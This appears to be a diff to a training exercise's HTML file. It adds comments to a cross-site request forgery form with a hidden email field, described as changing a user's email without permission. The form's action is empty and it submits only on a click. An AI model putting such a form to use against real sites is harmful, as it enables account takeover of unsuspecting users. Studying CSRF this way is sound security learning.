@@ -1,3 +1,5 @@
+<!--generating a form with CSRF techniques to change the user's email without his permission-->
+
 <!doctype html>
 <html lang="en">
 <head>
@@ -5,9 +7,11 @@
   <title>Sample html</title>
 </head>
 <body>
-  
+  <!--structure of the CSRF form-->
   <form id = "csrf-form" action = "" method="POST">
+    <!--holding the new email value using hidden input-->
     <input type = "hidden" name = "email" id = "id_email" value = "quera@example.com">
+    <!--submit button to trigger the attack-->
     <input type = "submit" value = "Submit Request">
   </form>
 
